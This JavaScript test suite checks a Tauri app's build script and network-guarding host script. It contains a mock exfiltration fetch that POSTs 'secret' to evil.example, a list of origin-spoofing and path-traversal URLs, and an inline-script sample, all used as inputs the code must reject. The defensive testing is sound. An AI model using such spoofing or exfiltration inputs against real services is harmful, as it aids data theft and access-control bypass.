import assert from "node:assert/strict";
import { test } from "node:test";
import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { clientRuntimeConnectSrc, clientRuntimeProblems } from "../vendor/kotoba-client-runtime.js";
import { descriptor, requestedCapabilities } from "../src/descriptor.mjs";

const here = fileURLToPath(new URL("../", import.meta.url));
const fixture = () => {
  const dir = mkdtempSync(path.join(tmpdir(), "tauri-fixture-"));
  mkdirSync(path.join(dir, "in/sub"), { recursive: true });
  writeFileSync(path.join(dir, "in/index.html"), '<!doctype html><html><head><style>a{}</style></head><body><nav></nav><a href="https://example.com/x" style="color:red">x</a><script src="/app.js"></script></body></html>');
  writeFileSync(path.join(dir, "in/sub/page.html"), "<html><head></head><body></body></html>");
  writeFileSync(path.join(dir, "in/app.js"), "");
  return { src: path.join(dir, "in"), out: path.join(dir, "out") };
};
const build = (src, out) => execFileSync(process.execPath, [path.join(here, "scripts/build.mjs")], { env: { ...process.env, STATIC_SRC: src, TAURI_DIST: out }, stdio: "pipe" });

test("descriptor is valid for the shared runtime and every operation is each-operation consent", () => {
  assert.deepEqual(clientRuntimeProblems(descriptor, requestedCapabilities(descriptor), ["https://tauri.localhost"]), []);
  assert.ok(descriptor.operations.every((o) => o.consent === "each-operation"));
  assert.ok(descriptor.operations.every((o) => o.endpoint.origin !== "https://tauri.localhost"));
});

test("build folds the pages into one document with a CSP derived from the descriptor and the host injected", () => {
  const { src, out } = fixture();
  build(src, out);
  for (const page of ["index.html"]) {
    const html = readFileSync(path.join(out, page), "utf8");
    const csp = html.match(/Content-Security-Policy" content="([^"]+)"/)[1];
    assert.match(csp, /default-src 'none'/);
    assert.match(csp, /script-src 'self'(;|$)/);
    assert.match(csp, /connect-src 'self' https:\/\/bots\.itonami\.cloud ipc: http:\/\/ipc\.localhost/);
    assert.doesNotMatch(csp, /'none' ipc/);
    assert.ok(html.includes('<script type="module" src="/host.js"></script>'));
  }
  assert.match(readFileSync(path.join(out, "index.html"), "utf8"), /style-src 'self' 'sha256-[^']+'; style-src-attr 'unsafe-inline'/);
  // One document (KOTOBA-159): the other page is folded in as a hidden section.
  assert.match(readFileSync(path.join(out, "index.html"), "utf8"), /<section data-page="\/sub\/page\.html" data-title="" hidden>/);
  assert.equal(existsSync(path.join(out, "sub/page.html")), false);
  const release = JSON.parse(readFileSync(path.join(out, "release.json"), "utf8"));
  assert.ok(release.files["host.js"] && release.files["runtime.js"] && release.files["descriptor.json"]);
});

test("build fails closed on a missing entry page, an inline script or an existing CSP", () => {
  for (const [label, html] of [["inline script", "<html><head></head><body><script>alert(1)</script></body></html>"],
    ["no head", "x"],
    ["existing CSP", '<html><head><meta http-equiv="Content-Security-Policy" content="x"></head></html>']]) {
    const f = fixture();
    writeFileSync(path.join(f.src, "index.html"), html);
    assert.throws(() => build(f.src, f.out), /tauri build/u, label);
  }
  const none = fixture();
  assert.throws(() => build(path.join(none.src, "nope"), none.out), /tauri build/u);
});

test("host refuses undeclared cross-origin requests without touching the network and passes same-origin ones", async () => {
  const { src, out } = fixture();
  build(src, out);
  const calls = [];
  globalThis.location = new URL("https://tauri.localhost/index.html");
  globalThis.fetch = async (input) => { calls.push(String(input)); return { ok: true }; };
  const listeners = [];
  globalThis.document = { addEventListener: (type, fn) => listeners.push([type, fn]), createElement: () => ({ style: {}, append() {}, setAttribute() {}, addEventListener() {}, remove() {} }), body: { append() {} }, head: { append() {} } };
  await import(pathToFileURL(path.join(out, "host.js")).href);
  assert.deepEqual(await fetch("/local.json"), { ok: true });
  await assert.rejects(() => fetch("https://evil.example/x"), TypeError);
  await assert.rejects(() => fetch("https://evil.example/x", { method: "POST", body: "secret" }), TypeError);
  assert.deepEqual(calls, ["/local.json"]);
  const click = listeners.find(([type]) => type === "click")[1];
  let prevented = false;
  click({ target: { closest: () => ({ getAttribute: () => "https://example.com/out" }) }, preventDefault: () => { prevented = true; } });
  assert.equal(prevented, true);
  prevented = false;
  click({ target: { closest: () => ({ getAttribute: () => "/local.html" }) }, preventDefault: () => { prevented = true; } });
  assert.equal(prevented, false);

  // ZB12-012: host refuses >128-char, dot-segment, unicode, confusable-origin, credentialed, and malformed URLs
  // without touching the network or opening consent.
  for (const [label, badUrl] of [
    ["129-char bot id", `https://bots.itonami.cloud/v1/grok-bots/bots/${"a".repeat(129)}/activity`],
    ["dot-segment traversal to declared route", "https://bots.itonami.cloud/v1/grok-bots/bots/../businesses"],
    ["single-dot segment", "https://bots.itonami.cloud/v1/grok-bots/bots/./business-8569-x/activity"],
    ["encoded dot traversal", "https://bots.itonami.cloud/v1/grok-bots/bots/%2e%2e/businesses"],
    ["backslash traversal", "https://bots.itonami.cloud/v1/grok-bots/bots/a\\..\\businesses"],
    ["unicode Japanese bot id", "https://bots.itonami.cloud/v1/grok-bots/bots/ボット/activity"],
    ["unicode Cyrillic bot id", "https://bots.itonami.cloud/v1/grok-bots/bots/b\u043et-1/activity"],
    ["Cyrillic confusable origin", "https://b\u043ets.itonami.cloud/v1/grok-bots/businesses"],
    ["suffix spoof origin", "https://bots.itonami.cloud.evil.example/v1/grok-bots/businesses"],
    ["userinfo spoof origin", "https://bots.itonami.cloud@evil.example/v1/grok-bots/businesses"],
    ["credentials on declared origin", "https://user:pass@bots.itonami.cloud/v1/grok-bots/businesses"],
    ["credentials on same origin", "https://user:pass@tauri.localhost/local.json"],
    ["scheme downgrade", "http://bots.itonami.cloud/v1/grok-bots/businesses"],
    ["port confusion", "https://bots.itonami.cloud:8443/v1/grok-bots/businesses"],
    ["malformed URL", "http://[::1"],
  ]) {
    await assert.rejects(() => fetch(badUrl), TypeError, label);
  }
  assert.deepEqual(calls, ["/local.json"]);

  // Malformed href click fails closed (preventDefault called instead of throwing)
  prevented = false;
  click({ target: { closest: () => ({ getAttribute: () => "http://[::1" }) }, preventDefault: () => { prevented = true; } });
  assert.equal(prevented, true);
});

test("ZB12-001: tauri.conf.json declares a non-null CSP aligned with descriptor.mjs", () => {
  const conf = JSON.parse(readFileSync(path.join(here, "src-tauri/tauri.conf.json"), "utf8"));
  const csp = conf?.app?.security?.csp;
  assert.equal(typeof csp, "string", "app.security.csp must not be null");
  const directives = Object.fromEntries(
    csp.split(";").map((d) => d.trim()).filter(Boolean).map((d) => {
      const i = d.indexOf(" ");
      return i < 0 ? [d, ""] : [d.slice(0, i), d.slice(i + 1)];
    }),
  );
  const derived = clientRuntimeConnectSrc(descriptor, requestedCapabilities(descriptor), [], ["https://tauri.localhost"]);
  const expectedConnect = `${derived.replace("connect-src ", "'self' ")} ipc: http://ipc.localhost`;
  assert.equal(directives["default-src"], "'none'");
  assert.equal(directives["script-src"], "'self'");
  assert.equal(directives["connect-src"], expectedConnect);
  assert.equal(directives["object-src"], "'none'");
  assert.equal(directives["frame-src"], "'none'");
  assert.equal(directives["frame-ancestors"], "'none'");
  assert.equal(directives["base-uri"], "'none'");
  assert.equal(directives["form-action"], "'none'");
  assert.doesNotMatch(directives["script-src"], /unsafe-inline|unsafe-eval/u);

  // Negative controls: build fails closed if tauri.conf.json has csp: null or drifted connect-src
  for (const [label, badCsp] of [
    ["null csp", null],
    ["drifted connect-src", "default-src 'none'; connect-src 'self' https://evil.example ipc: http://ipc.localhost"],
  ]) {
    const f = fixture();
    const badConf = path.join(path.dirname(f.src), "tauri.conf.json");
    writeFileSync(badConf, JSON.stringify({ app: { security: { csp: badCsp } } }));
    assert.throws(
      () => execFileSync(process.execPath, [path.join(here, "scripts/build.mjs")], {
        env: { ...process.env, STATIC_SRC: f.src, TAURI_DIST: f.out, TAURI_CONF: badConf },
        stdio: "pipe",
      }),
      /tauri build/u,
      label,
    );
  }
});
